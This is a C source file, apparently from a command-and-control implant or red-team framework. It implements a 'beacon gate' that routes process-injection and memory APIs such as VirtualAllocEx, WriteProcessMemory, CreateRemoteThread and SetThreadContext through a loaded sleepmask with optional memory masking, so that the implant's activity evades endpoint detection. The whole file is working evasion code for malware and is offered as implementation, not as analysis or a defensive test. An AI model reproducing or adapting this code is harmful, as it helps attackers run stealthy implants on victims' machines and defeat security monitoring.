#include "config.h"
#include "common.h"
#include "evasion/sleepmask.h"
#include "evasion/beacon_gate_impl.h"

VOID beacon_gate_enable(PINSTANCE inst) {
    inst->bBeaconGateEnabled = TRUE;
}

VOID beacon_gate_disable(PINSTANCE inst) {
    inst->bBeaconGateEnabled = FALSE;
}

VOID beacon_gate_enable_masking(PINSTANCE inst) {
    inst->bBeaconGateMasking = TRUE;
}

VOID beacon_gate_disable_masking(PINSTANCE inst) {
    inst->bBeaconGateMasking = FALSE;
}

VOID beacon_gate_dispatch(PINSTANCE inst, PFUNCTION_CALL fc) {
    if (!inst->pfnSleepMask || !inst->bSleepMaskLoaded)
        return;

    populate_beacon_info(inst);

    void* saved_teb = coff_read_teb_user_ptr();
    coff_set_inst_for_mask(inst);

    typedef void (*SLEEPMASK_FN)(PBEACON_INFO, PFUNCTION_CALL);
    SLEEPMASK_FN fn = (SLEEPMASK_FN)inst->pfnSleepMask;
    fn(&inst->BeaconInfo, fc);

    coff_restore_teb_user_ptr(saved_teb);
}

// ─── Per-API gate wrappers ───
// Each wrapper checks bBeaconGateEnabled: if enabled + sleepmask loaded,
// routes the call through the sleepmask via beacon_gate_dispatch.
// Otherwise falls through to the direct Win32 call.

#define GATE_CHECK(inst) \
    ((inst)->bBeaconGateEnabled && (inst)->pfnSleepMask && (inst)->bSleepMaskLoaded)

LPVOID gate_VirtualAlloc(PINSTANCE inst, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    if (!GATE_CHECK(inst))
        return inst->Win32.VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);

    FUNCTION_CALL fc;
    es_memset(&fc, 0, sizeof(FUNCTION_CALL));
    fc.functionPtr = (PVOID)inst->Win32.VirtualAlloc;
    fc.function    = VIRTUALALLOC;
    fc.numOfArgs   = 4;
    fc.args[0] = (ULONG_PTR)lpAddress;
    fc.args[1] = (ULONG_PTR)dwSize;
    fc.args[2] = (ULONG_PTR)flAllocationType;
    fc.args[3] = (ULONG_PTR)flProtect;
    fc.bMask   = inst->bBeaconGateMasking;
    beacon_gate_dispatch(inst, &fc);
    return (LPVOID)fc.retValue;
}

LPVOID gate_VirtualAllocEx(PINSTANCE inst, HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    if (!GATE_CHECK(inst))
        return inst->Win32.VirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect);

    FUNCTION_CALL fc;
    es_memset(&fc, 0, sizeof(FUNCTION_CALL));
    fc.functionPtr = (PVOID)inst->Win32.VirtualAllocEx;
    fc.function    = VIRTUALALLOCEX;
    fc.numOfArgs   = 5;
    fc.args[0] = (ULONG_PTR)hProcess;
    fc.args[1] = (ULONG_PTR)lpAddress;
    fc.args[2] = (ULONG_PTR)dwSize;
    fc.args[3] = (ULONG_PTR)flAllocationType;
    fc.args[4] = (ULONG_PTR)flProtect;
    fc.bMask   = inst->bBeaconGateMasking;
    beacon_gate_dispatch(inst, &fc);
    return (LPVOID)fc.retValue;
}

BOOL gate_VirtualProtect(PINSTANCE inst, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
    if (!GATE_CHECK(inst))
        return inst->Win32.VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect);

    FUNCTION_CALL fc;
    es_memset(&fc, 0, sizeof(FUNCTION_CALL));
    fc.functionPtr = (PVOID)inst->Win32.VirtualProtect;
    fc.function    = VIRTUALPROTECT;
    fc.numOfArgs   = 4;
    fc.args[0] = (ULONG_PTR)lpAddress;
    fc.args[1] = (ULONG_PTR)dwSize;
    fc.args[2] = (ULONG_PTR)flNewProtect;
    fc.args[3] = (ULONG_PTR)lpflOldProtect;
    fc.bMask   = inst->bBeaconGateMasking;
    beacon_gate_dispatch(inst, &fc);
    return (BOOL)fc.retValue;
}

BOOL gate_VirtualProtectEx(PINSTANCE inst, HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
    if (!inst->Win32.VirtualProtectEx)
        return FALSE;
    if (!GATE_CHECK(inst))
        return inst->Win32.VirtualProtectEx(hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect);

    FUNCTION_CALL fc;
    es_memset(&fc, 0, sizeof(FUNCTION_CALL));
    fc.functionPtr = (PVOID)inst->Win32.VirtualProtectEx;
    fc.function    = VIRTUALPROTECTEX;
    fc.numOfArgs   = 5;
    fc.args[0] = (ULONG_PTR)hProcess;
    fc.args[1] = (ULONG_PTR)lpAddress;
    fc.args[2] = (ULONG_PTR)dwSize;
    fc.args[3] = (ULONG_PTR)flNewProtect;
    fc.args[4] = (ULONG_PTR)lpflOldProtect;
    fc.bMask   = inst->bBeaconGateMasking;
    beacon_gate_dispatch(inst, &fc);
    return (BOOL)fc.retValue;
}

BOOL gate_VirtualFree(PINSTANCE inst, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType) {
    if (!GATE_CHECK(inst))
        return inst->Win32.VirtualFree(lpAddress, dwSize, dwFreeType);

    FUNCTION_CALL fc;
    es_memset(&fc, 0, sizeof(FUNCTION_CALL));
    fc.functionPtr = (PVOID)inst->Win32.VirtualFree;
    fc.function    = VIRTUALFREE;
    fc.numOfArgs   = 3;
    fc.args[0] = (ULONG_PTR)lpAddress;
    fc.args[1] = (ULONG_PTR)dwSize;
    fc.args[2] = (ULONG_PTR)dwFreeType;
    fc.bMask   = inst->bBeaconGateMasking;
    beacon_gate_dispatch(inst, &fc);
    return (BOOL)fc.retValue;
}

BOOL gate_VirtualFreeEx(PINSTANCE inst, HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType) {
    if (!inst->Win32.VirtualFreeEx)
        return FALSE;
    if (!GATE_CHECK(inst))
        return inst->Win32.VirtualFreeEx(hProcess, lpAddress, dwSize, dwFreeType);

    FUNCTION_CALL fc;
    es_memset(&fc, 0, sizeof(FUNCTION_CALL));
    fc.functionPtr = (PVOID)inst->Win32.VirtualFreeEx;
    fc.function    = VIRTUALFREEEX;
    fc.numOfArgs   = 4;
    fc.args[0] = (ULONG_PTR)hProcess;
    fc.args[1] = (ULONG_PTR)lpAddress;
    fc.args[2] = (ULONG_PTR)dwSize;
    fc.args[3] = (ULONG_PTR)dwFreeType;
    fc.bMask   = inst->bBeaconGateMasking;
    beacon_gate_dispatch(inst, &fc);
    return (BOOL)fc.retValue;
}

SIZE_T gate_VirtualQuery(PINSTANCE inst, LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength) {
    if (!inst->Win32.VirtualQuery)
        return 0;
    if (!GATE_CHECK(inst))
        return inst->Win32.VirtualQuery(lpAddress, lpBuffer, dwLength);

    FUNCTION_CALL fc;
    es_memset(&fc, 0, sizeof(FUNCTION_CALL));
    fc.functionPtr = (PVOID)inst->Win32.VirtualQuery;
    fc.function    = VIRTUALQUERY;
    fc.numOfArgs   = 3;
    fc.args[0] = (ULONG_PTR)lpAddress;
    fc.args[1] = (ULONG_PTR)lpBuffer;
    fc.args[2] = (ULONG_PTR)dwLength;
    fc.bMask   = inst->bBeaconGateMasking;
    beacon_gate_dispatch(inst, &fc);
    return (SIZE_T)fc.retValue;
}

SIZE_T gate_VirtualQueryEx(PINSTANCE inst, HANDLE hProcess, LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength) {
    if (!inst->Win32.VirtualQueryEx)
        return 0;
    if (!GATE_CHECK(inst))
        return inst->Win32.VirtualQueryEx(hProcess, lpAddress, lpBuffer, dwLength);

    FUNCTION_CALL fc;
    es_memset(&fc, 0, sizeof(FUNCTION_CALL));
    fc.functionPtr = (PVOID)inst->Win32.VirtualQueryEx;
    fc.function    = VIRTUALQUERYEX;
    fc.numOfArgs   = 4;
    fc.args[0] = (ULONG_PTR)hProcess;
    fc.args[1] = (ULONG_PTR)lpAddress;
    fc.args[2] = (ULONG_PTR)lpBuffer;
    fc.args[3] = (ULONG_PTR)dwLength;
    fc.bMask   = inst->bBeaconGateMasking;
    beacon_gate_dispatch(inst, &fc);
    return (SIZE_T)fc.retValue;
}

HANDLE gate_CreateThread(PINSTANCE inst, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
    if (!GATE_CHECK(inst))
        return inst->Win32.CreateThread(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);

    FUNCTION_CALL fc;
    es_memset(&fc, 0, sizeof(FUNCTION_CALL));
    fc.functionPtr = (PVOID)inst->Win32.CreateThread;
    fc.function    = CREATETHREAD;
    fc.numOfArgs   = 6;
    fc.args[0] = (ULONG_PTR)lpThreadAttributes;
    fc.args[1] = (ULONG_PTR)dwStackSize;
    fc.args[2] = (ULONG_PTR)lpStartAddress;
    fc.args[3] = (ULONG_PTR)lpParameter;
    fc.args[4] = (ULONG_PTR)dwCreationFlags;
    fc.args[5] = (ULONG_PTR)lpThreadId;
    fc.bMask   = inst->bBeaconGateMasking;
    beacon_gate_dispatch(inst, &fc);
    return (HANDLE)fc.retValue;
}

HANDLE gate_CreateRemoteThread(PINSTANCE inst, HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
    if (!inst->Win32.CreateRemoteThread)
        return NULL;
    if (!GATE_CHECK(inst))
        return inst->Win32.CreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);

    FUNCTION_CALL fc;
    es_memset(&fc, 0, sizeof(FUNCTION_CALL));
    fc.functionPtr = (PVOID)inst->Win32.CreateRemoteThread;
    fc.function    = CREATEREMOTETHREAD;
    fc.numOfArgs   = 7;
    fc.args[0] = (ULONG_PTR)hProcess;
    fc.args[1] = (ULONG_PTR)lpThreadAttributes;
    fc.args[2] = (ULONG_PTR)dwStackSize;
    fc.args[3] = (ULONG_PTR)lpStartAddress;
    fc.args[4] = (ULONG_PTR)lpParameter;
    fc.args[5] = (ULONG_PTR)dwCreationFlags;
    fc.args[6] = (ULONG_PTR)lpThreadId;
    fc.bMask   = inst->bBeaconGateMasking;
    beacon_gate_dispatch(inst, &fc);
    return (HANDLE)fc.retValue;
}

HANDLE gate_OpenProcess(PINSTANCE inst, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) {
    if (!GATE_CHECK(inst))
        return inst->Win32.OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);

    FUNCTION_CALL fc;
    es_memset(&fc, 0, sizeof(FUNCTION_CALL));
    fc.functionPtr = (PVOID)inst->Win32.OpenProcess;
    fc.function    = OPENPROCESS;
    fc.numOfArgs   = 3;
    fc.args[0] = (ULONG_PTR)dwDesiredAccess;
    fc.args[1] = (ULONG_PTR)bInheritHandle;
    fc.args[2] = (ULONG_PTR)dwProcessId;
    fc.bMask   = inst->bBeaconGateMasking;
    beacon_gate_dispatch(inst, &fc);
    return (HANDLE)fc.retValue;
}

HANDLE gate_OpenThread(PINSTANCE inst, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId) {
    if (!inst->Win32.OpenThread)
        return NULL;
    if (!GATE_CHECK(inst))
        return inst->Win32.OpenThread(dwDesiredAccess, bInheritHandle, dwThreadId);

    FUNCTION_CALL fc;
    es_memset(&fc, 0, sizeof(FUNCTION_CALL));
    fc.functionPtr = (PVOID)inst->Win32.OpenThread;
    fc.function    = OPENTHREAD;
    fc.numOfArgs   = 3;
    fc.args[0] = (ULONG_PTR)dwDesiredAccess;
    fc.args[1] = (ULONG_PTR)bInheritHandle;
    fc.args[2] = (ULONG_PTR)dwThreadId;
    fc.bMask   = inst->bBeaconGateMasking;
    beacon_gate_dispatch(inst, &fc);
    return (HANDLE)fc.retValue;
}

BOOL gate_CloseHandle(PINSTANCE inst, HANDLE hObject) {
    if (!GATE_CHECK(inst))
        return inst->Win32.CloseHandle(hObject);

    FUNCTION_CALL fc;
    es_memset(&fc, 0, sizeof(FUNCTION_CALL));
    fc.functionPtr = (PVOID)inst->Win32.CloseHandle;
    fc.function    = CLOSEHANDLE;
    fc.numOfArgs   = 1;
    fc.args[0] = (ULONG_PTR)hObject;
    fc.bMask   = inst->bBeaconGateMasking;
    beacon_gate_dispatch(inst, &fc);
    return (BOOL)fc.retValue;
}

BOOL gate_GetThreadContext(PINSTANCE inst, HANDLE hThread, LPCONTEXT lpContext) {
    if (!inst->Win32.GetThreadContext)
        return FALSE;
    if (!GATE_CHECK(inst))
        return inst->Win32.GetThreadContext(hThread, lpContext);

    FUNCTION_CALL fc;
    es_memset(&fc, 0, sizeof(FUNCTION_CALL));
    fc.functionPtr = (PVOID)inst->Win32.GetThreadContext;
    fc.function    = GETTHREADCONTEXT;
    fc.numOfArgs   = 2;
    fc.args[0] = (ULONG_PTR)hThread;
    fc.args[1] = (ULONG_PTR)lpContext;
    fc.bMask   = inst->bBeaconGateMasking;
    beacon_gate_dispatch(inst, &fc);
    return (BOOL)fc.retValue;
}

BOOL gate_SetThreadContext(PINSTANCE inst, HANDLE hThread, const CONTEXT* lpContext) {
    if (!inst->Win32.SetThreadContext)
        return FALSE;
    if (!GATE_CHECK(inst))
        return inst->Win32.SetThreadContext(hThread, lpContext);

    FUNCTION_CALL fc;
    es_memset(&fc, 0, sizeof(FUNCTION_CALL));
    fc.functionPtr = (PVOID)inst->Win32.SetThreadContext;
    fc.function    = SETTHREADCONTEXT;
    fc.numOfArgs   = 2;
    fc.args[0] = (ULONG_PTR)hThread;
    fc.args[1] = (ULONG_PTR)lpContext;
    fc.bMask   = inst->bBeaconGateMasking;
    beacon_gate_dispatch(inst, &fc);
    return (BOOL)fc.retValue;
}

DWORD gate_ResumeThread(PINSTANCE inst, HANDLE hThread) {
    if (!GATE_CHECK(inst))
        return inst->Win32.ResumeThread(hThread);

    FUNCTION_CALL fc;
    es_memset(&fc, 0, sizeof(FUNCTION_CALL));
    fc.functionPtr = (PVOID)inst->Win32.ResumeThread;
    fc.function    = RESUMETHREAD;
    fc.numOfArgs   = 1;
    fc.args[0] = (ULONG_PTR)hThread;
    fc.bMask   = inst->bBeaconGateMasking;
    beacon_gate_dispatch(inst, &fc);
    return (DWORD)fc.retValue;
}

HANDLE gate_CreateFileMappingA(PINSTANCE inst, HANDLE hFile, LPSECURITY_ATTRIBUTES lpAttributes, DWORD flProtect, DWORD dwMaxSizeHigh, DWORD dwMaxSizeLow, LPCSTR lpName) {
    if (!inst->Win32.CreateFileMappingA)
        return NULL;
    if (!GATE_CHECK(inst))
        return inst->Win32.CreateFileMappingA(hFile, lpAttributes, flProtect, dwMaxSizeHigh, dwMaxSizeLow, lpName);

    FUNCTION_CALL fc;
    es_memset(&fc, 0, sizeof(FUNCTION_CALL));
    fc.functionPtr = (PVOID)inst->Win32.CreateFileMappingA;
    fc.function    = CREATEFILEMAPPING;
    fc.numOfArgs   = 6;
    fc.args[0] = (ULONG_PTR)hFile;
    fc.args[1] = (ULONG_PTR)lpAttributes;
    fc.args[2] = (ULONG_PTR)flProtect;
    fc.args[3] = (ULONG_PTR)dwMaxSizeHigh;
    fc.args[4] = (ULONG_PTR)dwMaxSizeLow;
    fc.args[5] = (ULONG_PTR)lpName;
    fc.bMask   = inst->bBeaconGateMasking;
    beacon_gate_dispatch(inst, &fc);
    return (HANDLE)fc.retValue;
}

LPVOID gate_MapViewOfFile(PINSTANCE inst, HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap) {
    if (!inst->Win32.MapViewOfFile)
        return NULL;
    if (!GATE_CHECK(inst))
        return inst->Win32.MapViewOfFile(hFileMappingObject, dwDesiredAccess, dwFileOffsetHigh, dwFileOffsetLow, dwNumberOfBytesToMap);

    FUNCTION_CALL fc;
    es_memset(&fc, 0, sizeof(FUNCTION_CALL));
    fc.functionPtr = (PVOID)inst->Win32.MapViewOfFile;
    fc.function    = MAPVIEWOFFILE;
    fc.numOfArgs   = 5;
    fc.args[0] = (ULONG_PTR)hFileMappingObject;
    fc.args[1] = (ULONG_PTR)dwDesiredAccess;
    fc.args[2] = (ULONG_PTR)dwFileOffsetHigh;
    fc.args[3] = (ULONG_PTR)dwFileOffsetLow;
    fc.args[4] = (ULONG_PTR)dwNumberOfBytesToMap;
    fc.bMask   = inst->bBeaconGateMasking;
    beacon_gate_dispatch(inst, &fc);
    return (LPVOID)fc.retValue;
}

BOOL gate_UnmapViewOfFile(PINSTANCE inst, LPCVOID lpBaseAddress) {
    if (!inst->Win32.UnmapViewOfFile)
        return FALSE;
    if (!GATE_CHECK(inst))
        return inst->Win32.UnmapViewOfFile(lpBaseAddress);

    FUNCTION_CALL fc;
    es_memset(&fc, 0, sizeof(FUNCTION_CALL));
    fc.functionPtr = (PVOID)inst->Win32.UnmapViewOfFile;
    fc.function    = UNMAPVIEWOFFILE;
    fc.numOfArgs   = 1;
    fc.args[0] = (ULONG_PTR)lpBaseAddress;
    fc.bMask   = inst->bBeaconGateMasking;
    beacon_gate_dispatch(inst, &fc);
    return (BOOL)fc.retValue;
}

BOOL gate_DuplicateHandle(PINSTANCE inst, HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions) {
    if (!inst->Win32.DuplicateHandle)
        return FALSE;
    if (!GATE_CHECK(inst))
        return inst->Win32.DuplicateHandle(hSourceProcessHandle, hSourceHandle, hTargetProcessHandle, lpTargetHandle, dwDesiredAccess, bInheritHandle, dwOptions);

    FUNCTION_CALL fc;
    es_memset(&fc, 0, sizeof(FUNCTION_CALL));
    fc.functionPtr = (PVOID)inst->Win32.DuplicateHandle;
    fc.function    = DUPLICATEHANDLE;
    fc.numOfArgs   = 7;
    fc.args[0] = (ULONG_PTR)hSourceProcessHandle;
    fc.args[1] = (ULONG_PTR)hSourceHandle;
    fc.args[2] = (ULONG_PTR)hTargetProcessHandle;
    fc.args[3] = (ULONG_PTR)lpTargetHandle;
    fc.args[4] = (ULONG_PTR)dwDesiredAccess;
    fc.args[5] = (ULONG_PTR)bInheritHandle;
    fc.args[6] = (ULONG_PTR)dwOptions;
    fc.bMask   = inst->bBeaconGateMasking;
    beacon_gate_dispatch(inst, &fc);
    return (BOOL)fc.retValue;
}

BOOL gate_ReadProcessMemory(PINSTANCE inst, HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesRead) {
    if (!inst->Win32.ReadProcessMemory)
        return FALSE;
    if (!GATE_CHECK(inst))
        return inst->Win32.ReadProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);

    FUNCTION_CALL fc;
    es_memset(&fc, 0, sizeof(FUNCTION_CALL));
    fc.functionPtr = (PVOID)inst->Win32.ReadProcessMemory;
    fc.function    = READPROCESSMEMORY;
    fc.numOfArgs   = 5;
    fc.args[0] = (ULONG_PTR)hProcess;
    fc.args[1] = (ULONG_PTR)lpBaseAddress;
    fc.args[2] = (ULONG_PTR)lpBuffer;
    fc.args[3] = (ULONG_PTR)nSize;
    fc.args[4] = (ULONG_PTR)lpNumberOfBytesRead;
    fc.bMask   = inst->bBeaconGateMasking;
    beacon_gate_dispatch(inst, &fc);
    return (BOOL)fc.retValue;
}

BOOL gate_WriteProcessMemory(PINSTANCE inst, HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten) {
    if (!GATE_CHECK(inst))
        return inst->Win32.WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);

    FUNCTION_CALL fc;
    es_memset(&fc, 0, sizeof(FUNCTION_CALL));
    fc.functionPtr = (PVOID)inst->Win32.WriteProcessMemory;
    fc.function    = WRITEPROCESSMEMORY;
    fc.numOfArgs   = 5;
    fc.args[0] = (ULONG_PTR)hProcess;
    fc.args[1] = (ULONG_PTR)lpBaseAddress;
    fc.args[2] = (ULONG_PTR)lpBuffer;
    fc.args[3] = (ULONG_PTR)nSize;
    fc.args[4] = (ULONG_PTR)lpNumberOfBytesWritten;
    fc.bMask   = inst->bBeaconGateMasking;
    beacon_gate_dispatch(inst, &fc);
    return (BOOL)fc.retValue;
}

DWORD gate_WaitForSingleObject(PINSTANCE inst, HANDLE hHandle, DWORD dwMilliseconds) {
    if (!GATE_CHECK(inst))
        return inst->Win32.WaitForSingleObject(hHandle, dwMilliseconds);

    FUNCTION_CALL fc;
    es_memset(&fc, 0, sizeof(FUNCTION_CALL));
    fc.functionPtr = (PVOID)inst->Win32.WaitForSingleObject;
    fc.function    = WAITFORSINGLEOBJECT;
    fc.numOfArgs   = 2;
    fc.args[0] = (ULONG_PTR)hHandle;
    fc.args[1] = (ULONG_PTR)dwMilliseconds;
    fc.bMask   = inst->bBeaconGateMasking;
    beacon_gate_dispatch(inst, &fc);
    return (DWORD)fc.retValue;
}

VOID gate_Sleep(PINSTANCE inst, DWORD dwMilliseconds) {
    if (!GATE_CHECK(inst)) {
        inst->Win32.Sleep(dwMilliseconds);
        return;
    }

    FUNCTION_CALL fc;
    es_memset(&fc, 0, sizeof(FUNCTION_CALL));
    fc.functionPtr = (PVOID)inst->Win32.Sleep;
    fc.function    = SLEEP;
    fc.numOfArgs   = 1;
    fc.args[0] = (ULONG_PTR)dwMilliseconds;
    fc.bMask   = inst->bBeaconGateMasking;
    beacon_gate_dispatch(inst, &fc);
}

VOID gate_ExitThread(PINSTANCE inst, DWORD dwExitCode) {
    if (!GATE_CHECK(inst)) {
        inst->Win32.ExitThread(dwExitCode);
        return;
    }

    FUNCTION_CALL fc;
    es_memset(&fc, 0, sizeof(FUNCTION_CALL));
    fc.functionPtr = (PVOID)inst->Win32.ExitThread;
    fc.function    = EXITTHREAD;
    fc.numOfArgs   = 1;
    fc.args[0] = (ULONG_PTR)dwExitCode;
    fc.bMask   = inst->bBeaconGateMasking;
    beacon_gate_dispatch(inst, &fc);
}
